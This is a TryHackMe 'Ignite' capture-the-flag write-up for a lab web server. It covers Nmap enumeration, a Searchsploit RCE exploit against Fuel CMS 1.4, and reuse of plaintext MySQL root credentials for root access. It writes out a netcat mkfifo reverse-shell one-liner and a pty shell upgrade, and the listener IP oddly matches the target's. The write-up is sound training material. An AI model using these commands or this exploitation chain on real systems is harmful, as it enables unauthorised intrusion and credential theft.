**<p align="center">TryHackMe: Ignite</p>**
---

<p align="center">
  <img src="https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Ignite/Images/Ignite%20Image%201.png" alt="image alt" width="180" />
</p>

[![Day 11 & 12 of 30 – Hack Documentation Challenge](https://img.shields.io/badge/Day%2011%20%26%2012%20of%2030-Hack%20Documentation%20Challenge-crimson?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)

**Topic:** Web application pentesting 

**Started:** 7/2/2025

**Completed:** 7/3/2025

🎯**Objective:** This penetration testing lab is to assess the security posture of a new start-up's web server, which is reportedly experiencing a few issues. The goal is to identify and exploit existing vulnerabilities within the web application to uncover two hidden flags.

<p align="center">+++++++++</p>

Launching the target machine, completing an Nmap scan is the first step to enumerating a target IP `10.10.188.239`.

The scan revealed 1 port being visibly open: Port 80, Service HTTP, Version Apache httpd 2.4.18 ((Ubuntu)).

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Ignite/Images/Screenshot%201.png)

Since the Nmap scan confirmed that an HTTP service is running on the target machine, I proceeded to navigate to the IP address in my browser to begin exploring the web application.

Accessing the IP address directed me to the Fuel CMS homepage, which displayed the version number as 1.4.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Ignite/Images/Screenshot%202.png)

According to research, **Fuel CMS** is an open-source content management system built on the CodeIgniter PHP framework. It provides a user-friendly interface for content managers while also offering developers the flexibility to customize the application's behavior behind the scenes. In essence, it's both a CMS and a development platform.

Notably, Fuel CMS v1.4 is relatively outdated and is known to contain vulnerabilities, including Remote Code Execution (RCE), making it a strong candidate for exploitation in this challenge.

*(Note: My VM timed out during the process, so I had to relaunch the target machine.)*

While exploring the web server, I checked the `robots.txt` file and found a disallowed path: `/fuel/`. This suggests that the `/fuel/` directory may contain a sensitive interface, likely the CMS backend or admin panel.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Ignite/Images/Screenshot%203.png)

Using Searchsploit, I located a known Remote Code Execution exploit for Fuel CMS:
- `linux/webapps/47138.py`

This exploit specifically targets vulnerabilities within the `/fuel/` directory.

I customized the Python code by removing the Burp Suite proxy settings, as they weren’t needed for this setup.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Ignite/Images/Screenshot%204.png)

Running the customized exploit successfully launched a non-interactive shell on the target machine.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Ignite/Images/Screenshot%205.png)

To upgrade this shell to an interactive one, I opened a Netcat listener on port `5555` and used a reverse shell payload generated from the Reverse Shell Generator website.

```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.10.188.239 5555 > /tmp/f

```

This command quietly creates a named pipe (`mkfifo`) to establish a temporary communication tunnel between the attacker and target, allowing for interactive shell access.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Ignite/Images/Screenshot%206.png)

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Ignite/Images/Screenshot%207.png)

While testing commands through the non-interactive shell, I encountered the following error:
```
sudo: no tty present and no askpass program specified

```
This hinted that `www-data` might have sudo privileges, but was being prevented from executing commands due to the lack of a proper TTY. In other words, the system couldn’t prompt for a password in this shell type.
To resolve this, I ran the following command to spawn an interactive shell:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'

```
This successfully upgraded the shell and allowed smoother command interaction.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Ignite/Images/Screenshot%208.png)

Continuing my enumeration, I discovered a file named `database.php` located at:
```
/var/www/html/fuel/application/config/database.php

```
Inside, I found plaintext MySQL root credentials, stored in cleartext within the configuration.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Ignite/Images/Screenshot%209.png)

Using the retrieved credentials, I successfully attempted to escalate privileges by switching users. The credentials were reused at the system level, allowing me to gain full root access to the machine.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Ignite/Images/Screenshot%2010.png)

With root access established, I was able to locate both challenge flags:
- **User flag:** Found in the home directory
- **Root flag:** Located in `/root`

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Ignite/Images/Screenshot%2011.png)

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Ignite/Images/Screenshot%2012.png)

**Lessons Learned:**

This lab reinforced the value of trusting my instincts and staying patient through the troubleshooting process. I initially spent several hours trying to get the exploit to work, and although I had to start over, it allowed me to retrace my steps with confidence and complete the entire process in minutes the next day.

From recognizing an outdated CMS, to exploiting it with an RCE, and finally escalating to root through a reused credential, each step reminded me how small misconfigurations can create major security risks. It also showed me that I’m developing a sharper eye for enumeration and privilege escalation paths, the progress felt incredibly rewarding.

<p align="center">+++++++++</p>

🔒 Out of respect for the learning experience, I’ve chosen not to share the flag answers
directly. Instead, I’ve documented my full process to support both others and myself in
understanding the vulnerability.

**Resources**:
- [TryHackMe's Ignite Room](https://tryhackme.com/room/ignite)
